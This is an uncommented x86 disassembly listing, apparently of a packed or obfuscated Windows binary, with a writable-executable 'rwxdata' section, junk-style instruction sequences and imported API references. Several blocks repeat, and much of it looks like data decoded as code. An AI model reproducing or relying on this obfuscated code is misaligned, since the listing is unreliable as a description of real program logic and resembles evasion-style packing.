add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4cd049
call sub_5167c8
jpe rwxdata
popad
je rwxdata
fnstcw [ esi + 0x10242c88 ]
rcr [ ebp + ecx * 4 + 0xf082464 ] 0x83
fcom st4
add [ eax + 0x2d ] ch
in eax dx
push 0xbed9ed2d
mov [ esp ] ch
adc al al
pushfd
lea esp [ esp + 0x8 ]
jae rwxdata
inc esi
imul ebp [ ebp + 0x41 ] 0x89098200
sbb edi [ ebp + ebp + 0x6ee46a53 ]
inc esi
add al 0x4e
jl rwxdata
jmp rwxdata
push esp
jmp rwxdata
add [ eax ] al
inc ebx
jb rwxdata
add al 0x0
push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
jpe rwxdata
call sub_515ff7
pushad
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
je rwxdata
jns rwxdata
pushfd
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
lea esp [ esp + 0x24 ]
jne rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
jmp rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
jmp rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
jo rwxdata
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jne rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
sub_4cd107
lea esp [ esp + 0x28 ]
jae rwxdata
push esi
dec bl
pushfd
inc ecx
add esp 0x8
clc
cmp eax 0x7f
pushad
pushad
push [ esp + 0x10 ]
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
lea esp [ esp + 0x44 ]
ja rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
pushad
inc ecx
pushfd
inc bl
call sub_4ba811
add [ eax ] al
push edi
jb rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
popad
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
call sub_5191a9
fcmove st5
pop eax
imul esi [ ebx + 0x6b ] 0x65657246
push ebx
jo rwxdata
popad
je rwxdata
inc esi
imul ebp [ ebp ] 0x8246488
lea esp [ esp + 0x44 ]
je rwxdata
